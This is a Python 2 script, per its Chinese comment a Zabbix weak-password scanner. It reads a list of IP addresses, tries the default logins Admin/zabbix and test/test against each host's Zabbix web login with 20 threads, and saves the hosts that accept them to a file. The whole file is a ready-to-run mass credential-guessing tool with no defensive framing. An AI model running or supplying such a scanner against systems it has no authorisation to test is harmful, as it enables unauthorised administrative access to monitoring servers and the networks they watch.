#!/usr/bin/env python
# -*- coding:utf-8 -*-

# zabbix弱口令

import requests
import threading
from Queue import Queue

url_queue = Queue()
vul_queue = Queue()
THREAD_NUM = 20
vul_url_txt = open("zabbix_vul_ip.txt","w")
users = {
	"Admin":"zabbix",
	"test":"test"
}

class Zabbix:
	def __init__(self):
		self.headers = {
			"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36",
			"Content-Type":"application/x-www-form-urlencoded"
		}

	def set_ip(self,ip):
		self.ip = ip

	def check(self):
		global users
		urls = ["http://" + self.ip + "/index.php","http://" + self.ip + "/zabbix/index.php"]
		for url in urls:
			for (username,password) in users.items():
				data = "request=&name=" + username + "&password=" + password + "&autologin=1&enter=Sign+in"
				# print data
				try:
					response = requests.post(url = url,data = data,headers = self.headers,timeout = 10)
					if response.status_code == 200 and "Admin" in response.content:
						return True
						# pass
					# print "====================="
					# print response.text.find("Admin")
				except Exception,e:
					# print e
					pass
		return False

class testTarget(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)

	def run(self):
		global url_queue
		global THREAD_NUM
		zabbix = Zabbix()
		while not url_queue.empty():
			ip = url_queue.get()
			print "Checing " + ip
			zabbix.set_ip(ip)
			if zabbix.check():
				vul_queue.put(ip)

def test():
	threads = []
	for i in range(THREAD_NUM):
		t = testTarget()
		t.start()
		threads.append(t)
	for t in threads:
		t.join()

if __name__ == '__main__':
	ip_text = open("zabbix_ip.txt","r")
	for line in ip_text:
		url_queue.put(line.strip("\n"))
	ip_text.close()
	test()
	while not vul_queue.empty():
		vul_url_txt.write(vul_queue.get() + "\n")

	vul_url_txt.close()
